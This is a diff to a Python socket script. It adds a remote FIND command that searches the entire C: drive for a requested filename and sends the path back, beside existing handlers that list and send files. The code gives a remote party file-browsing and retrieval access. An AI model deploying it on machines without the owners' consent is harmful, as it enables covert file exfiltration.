@@ -51,6 +51,19 @@ def show_files(s):
         else:
             print("unvalid input, if you want to quit type no")"""
 
+def get_filename_without_format(filename):
+    return filename.split(".")[0]
+
+def search_file_by_filename(filename):
+    full_filename = filename
+    filename = get_filename_without_format(filename)
+    print(f"FILENAME - {filename}")
+    for r, d, f in os.walk("C:\\"):
+        for file1 in f:
+            if file1 == full_filename:
+                print(os.path.join(r, full_filename))
+                return os.path.join(r, full_filename)
+
 
 def send_file(s):
     path = s.recv(1024).decode()
@@ -71,6 +84,12 @@ def main():
     whatToDo = s.recv(1024).decode()
     if whatToDo == "DIR":
         show_files(s)
+    elif whatToDo == "FIND":
+        s.send("Enter  filename: ".encode())
+        filename = s.recv(1024).decode()  
+        print(f"FILENAME - {filename}")
+        file_to_download = search_file_by_filename(filename)
+        s.send((file_to_download.encode()))
     s.close()
     
 
